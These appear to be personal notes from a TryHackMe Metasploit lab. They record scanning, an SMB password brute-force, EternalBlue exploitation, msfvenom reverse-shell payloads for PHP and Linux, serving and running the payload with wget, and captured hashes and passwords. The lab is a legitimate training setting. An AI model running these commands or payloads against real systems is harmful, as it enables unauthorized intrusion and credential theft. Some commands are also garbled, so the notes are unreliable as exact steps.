#Metasploit 

- https://tryhackme.com/room/metasploitexploitation


/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt

## Scanning

```

msfconsole

search portscan
use 5
show options
set rhosts 10.10.78.158

scanner/discovery/udp_sweep

search smb
	101  auxiliary/scanner/smb/smb_enumshares 

use 101
run



search smb
use 101
search portscanner
use 0
setg rhosts 10.10.78.158
exploit

nmap -sS 10.10.78.158

5 open ports


search netbios
use 2
exploit
	acme it support


nmap -sS -sV 10.10.78.158        # search http_version
8000/tcp  WebFS httpd 2.21


penny user SMB password smb_login

search smb_login
use 0
show options


setg pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
show options

set db_all_cred true
setg SMBUser penny
exploit

penny : leo1234

```

## Database


```
systemctl start postgresql

msfdb init

msfconsole
db_status

workspace -a tryhackme
workspace -h

db_nmap -sV -p- 10.10.78.158

hosts
hosts -h
services -h

use auxiliary/scanner/smb/smb_ms17_010
hosts -R
show options
run


services -S netbios

```

- HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). 
- FTP: Could allow anonymous login and provide access to interesting files. 
- SMB: Could be vulnerable to SMB exploits like MS17-010
- SSH: Could have default or easy to guess credentials
- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.


## Vuln Scan

```

use auxiliary/scanner/vnc/
use 2
info


search smtp
use 23
info 
Campbell Murray

```


## Exploitation

```

search
info
exploit

exploit(windows/smb/ms17_010_eternalblue) > show payloads

set payload 2
show options
set rhost 10.10.15.0 
show options
exploit

search -f flag.txt

cd \Users\
dir
cd \Jon\Documents
type flag.txt
THM-5455554845



NTLM hash for user 'pirate'

8ce9a3ebd1647fcc5e04025019f4b975


```


## msfvenom

```

msfvenom -l payloads

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64

msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

/*<?php /**/

use exploit/multi/handler
run



---- VM
sudo su
murphy : 1q2w3e4r

-- terminal
ssh murphy@10.10.102.190
sudo su

-- new tab
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

python3 -m http.server 9000

browser http://10.10.218.3:9000    # shows files

terminal
wget http://10.10.210.3:9000/rev_shell.elf

msfconsole
use exploit/multi/handler


set payload linux/x86/meterpreter/reverse_tcp

set lhost 10.10.210.3
set lport 7777
show options
run


msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.218.3 LPORT=1234 -f elf > rev_shell2.elf

python3 -m http.server 9000

wget http://10.10.210.3:9000/rev_shell2.elf


msfconsole
use exploit/multi/handler

set msfvenom -p linux/x86/meterpreter/reverse_tcp

set lhost 10.10.210.3
set lport 1234
show options
run


chmod 777 rev_shell2.elf
./rev_shell2.elf


claire : $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0




```













